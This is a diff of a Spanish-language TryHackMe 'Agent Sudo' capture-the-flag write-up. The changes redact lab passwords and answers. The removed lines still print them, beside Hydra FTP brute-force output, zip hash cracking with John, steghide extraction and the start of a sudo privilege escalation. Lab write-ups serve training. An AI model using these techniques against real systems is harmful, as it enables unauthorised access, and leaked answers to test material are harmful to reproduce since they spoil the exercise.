@@ -69,7 +69,7 @@
         "datePublished": "2020-02-04 00:00:00 &#43;0000 UTC",
         "dateModified" : "2020-02-04 00:00:00 &#43;0000 UTC",
         "url" : "/posts/agent_sudo/",
-        "wordCount" : "1245",
+        "wordCount" : "1244",
         "keywords" : [ "tryhackme","CVE-2019-14287","Blog" ]
     }
     </script>
@@ -384,7 +384,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-04 22:13:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking ftp://10.10.235.45:21/
 [STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
-[21][ftp] host: 10.10.235.45   login: chris   password: crystal
+[21][ftp] host: 10.10.235.45   login: chris   password: *******
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-04 22:14:56
 </code></pre>
@@ -466,7 +466,7 @@ root@aoiri:~/tryhackme/agentsudo/tmp#
 <pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# zip2john 8702.zip &gt; hash_zip
 ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# cat hash_zip 
-8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
+8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e[... hash-here-dont-show-cuz-tryhackme-ban-me-:v-end ...]*$/zip2$:To_agentR.txt:8702.zip:8702.zip
 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# john hash_zip 
 Using default input encoding: UTF-8
 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
@@ -476,7 +476,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Almost done: Processing the remaining buffered candidate passwords, if any.
 Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
 Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
-alien            (8702.zip/To_agentR.txt)
+*****            (8702.zip/To_agentR.txt)
 1g 0:00:00:00 DONE 2/3 (2020-02-04 22:58) 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed
@@ -500,7 +500,7 @@ Type = zip
 Physical Size = 280
 
     
-Enter password (will not be echoed): alien
+Enter password (will not be echoed): *****
 Everything is Ok    
 
 Size:       86
@@ -514,7 +514,7 @@ root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# ls
 <pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted# cat To_agentR.txt 
 Agent C,
 
-We need to send the picture to 'QXJlYTUx' as soon as possible!
+We need to send the picture to '*******' as soon as possible!
 
 By,
 Agent R
@@ -524,12 +524,12 @@ root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.png.extracted#
 <p>Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:</p>
 
 <pre><code class="language-bash">root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg 
-Enter passphrase: Area51
+Enter passphrase: 
 wrote extracted data to &quot;message.txt&quot;.
 root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt 
 Hi james,
 
-Glad you find this message. Your login password is hackerrules!
+Glad you find this message. Your login password is ************
 
 Don't ask me why the password look cheesy, ask agent R who set this password for you.
 
@@ -542,16 +542,11 @@ root@aoiri:~/tryhackme/agentsudo/tmp#
 
 <p>Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag <strong>user.txt</strong>.</p>
 
-<p>Credenciales:</p>
-
-<pre><code>james:hackerrules!
-</code></pre>
-
 <p><img src="../../image/tryhackme/agentsudo/Screenshot_20200204_231631.png" alt="image" /></p>
 
 <h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
 
-<p>Hacemos una enumeracion sencilla con sudo -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.</p>
+<p>Hacemos una enumeracion sencilla con <code>sudo -l</code> para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.</p>
 
 <pre><code class="language-bash">james@agent-sudo:~$ sudo -l -l
 [sudo] password for james: 
